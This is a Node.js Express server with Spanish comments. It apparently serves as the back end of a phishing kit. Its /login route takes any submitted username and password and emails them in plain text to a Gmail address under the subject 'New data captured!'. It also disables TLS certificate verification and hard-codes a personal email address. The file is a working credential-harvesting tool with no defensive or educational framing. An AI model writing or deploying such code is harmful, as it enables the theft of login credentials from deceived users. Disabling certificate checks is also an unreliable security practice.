require('dotenv').config();

const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

// --- CONFIGURACIÓN DE MIDDLEWARE ---
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// --- 1. ARCHIVOS ESTÁTICOS ---
app.use(express.static(path.join(__dirname, 'public')));

// --- 2. CONFIGURACIÓN DE CORREO (PLAN B: PUERTO 465 SSL) ---
// Esta configuración fuerza la conexión segura inmediatamente.
// Suele funcionar mejor en servidores Cloud como Render.
const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 465,               // Puerto SSL directo
    secure: true,            // true es OBLIGATORIO para el puerto 465
    auth: {
        user: 'paschasin1234@gmail.com',
        pass: process.env.GMAIL_PASSWORD // Tu contraseña de aplicación
    },
    family: 4,
    logger: true,
    debug: true,
    tls: {
       
        rejectUnauthorized: false 
    },
    // Opciones para evitar que se quede colgado eternamente
    connectionTimeout: 10000, // 10 segundos máximo para conectar
  
});

// Verificación inicial (Solo informativa, no detiene la app si falla al inicio)
transporter.verify()
    .then(() => console.log('🟢 Transporter listo en puerto 465'))
    .catch((err) => console.log('🔴 Advertencia de conexión al inicio:', err.message));


// --- RUTA PARA RECIBIR LOS DATOS ---
app.post('/login', (req, res) => {
    const { usuario, password } = req.body;

    console.log(`Intento de envío de: ${usuario}`);

    const mailOptions = {
        from: 'paschasin1234@gmail.com',
        to: 'paschasin1234@gmail.com',
        subject: '¡Nuevos datos capturados!',
        text: `Se han enviado nuevos datos del formulario:\n\nUsuario: ${usuario}\nContraseña: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('❌ Error enviando correo:', error);
            // Devolvemos error 500 para que tu frontend sepa que falló
            res.status(500).send('Error interno de conexión con Gmail'); 
        } else {
            console.log('✅ Correo enviado con éxito: ' + info.response);
            res.status(200).send('Datos recibidos correctamente');
        }
    });
});

// --- RUTA DE PRUEBA (HEALTH CHECK) ---
app.get('/ping', (req, res) => {
    res.send('Pong! El servidor está vivo.');
});

// --- 3. INICIO DEL SERVIDOR ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor corriendo exitosamente en puerto ${PORT}`);
});